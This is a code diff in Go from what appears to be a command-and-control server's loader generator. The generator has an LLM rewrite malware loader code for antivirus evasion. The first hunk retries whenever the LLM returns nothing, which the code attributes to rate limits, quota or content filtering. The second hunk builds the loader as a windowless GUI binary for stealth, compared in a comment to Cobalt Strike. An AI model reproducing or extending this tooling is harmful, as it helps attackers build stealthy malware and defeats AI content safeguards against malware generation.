@@ -140,6 +140,10 @@ func (s *Server) c2LoaderGenerateAPI(w http.ResponseWriter, r *http.Request) {
 				if pi := strings.Index(mutated, "package main"); pi > 0 {
 					mutated = mutated[pi:]
 				}
+				if len(strings.TrimSpace(mutated)) == 0 {
+					log.Printf("[evasion] AI 变形第 %d 次 LLM 返回空内容（限流/配额/内容过滤），重试", attempt)
+					continue
+				}
 				if strings.Count(mutated, "_ipv4Data") < 1 {
 					// 调试：落盘 LLM 返回与期望骨架，诊断占位符丢失形态
 					_ = os.WriteFile(filepath.Join(workRoot, "evasion-build", fmt.Sprintf("ai_mut_%d.log", attempt)), []byte(mutated), 0o644)
@@ -412,7 +416,8 @@ func buildEvasionLoader(ctx context.Context, loaderSrc string) ([]byte, error) {
 			goBin = p
 		}
 	}
-	cmd := exec.CommandContext(c, goBin, "build", "-trimpath", "-ldflags", "-s -w", "-buildvcs=false", "-o", out, ".")
+	// -H windowsgui：loader 零控制台——console 子系统双击会闪/挂黑框（CS/vshell 无窗体验）
+	cmd := exec.CommandContext(c, goBin, "build", "-trimpath", "-ldflags", "-s -w -H windowsgui", "-buildvcs=false", "-o", out, ".")
 	cmd.Env = env
 	cmd.Dir = dir
 	if out_, err := cmd.CombinedOutput(); err != nil {
